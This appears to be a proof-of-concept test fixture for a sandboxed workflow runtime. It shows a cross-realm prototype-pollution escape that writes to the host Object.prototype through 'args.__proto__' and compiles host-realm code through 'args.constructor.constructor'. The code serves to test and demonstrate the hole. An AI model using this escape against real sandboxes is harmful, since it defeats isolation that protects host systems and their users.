// goal-poc3: cross-realm prototype pollution via `args`. The lowering rewrites the
// facade constant `args` to `__host.args` — `JSON.parse(argsJson)` created in the
// child HOST realm (src/dwf/child-main.ts:107) — so `args.__proto__` IS the HOST
// Object.prototype (a plain object: one hop). Two fixtures split the effects:
//  - this file: plant `sandboxPwned` on HOST Object.prototype and read it back with a
//    HOST-compiled function (`args.constructor.constructor`) — proof the pollution
//    crossed the realm boundary; the proof rides the return value (frames stay clean);
//  - goal-poc3c: `toJSON` pollution that mangles every parent-bound frame.
//
// Form note: `args` must be written as `(args as any)` — the lowering skips an
// identifier whose parent is a VariableDeclaration, so `const x = args;` stays
// un-lowered and faults at runtime ("args is not defined", fail-closed).
// Control case: goal-poc3b (realm-only pollution, contained).
report("POC3-pre-pollution-clean-frame");

(args as any).__proto__.sandboxPwned = "PWNED-PROTOTYPE-POLLUTION";

let hostProof = "proof-unavailable";
try {
  const hostF: any = (args as any).constructor.constructor;
  hostProof = hostF("return ({}).sandboxPwned ?? 'clean'")();
} catch (e) {
  hostProof = "proof-err:" + (e as Error).name;
}
report("POC3-HOST-PROOF:" + hostProof);

return { hostProof };
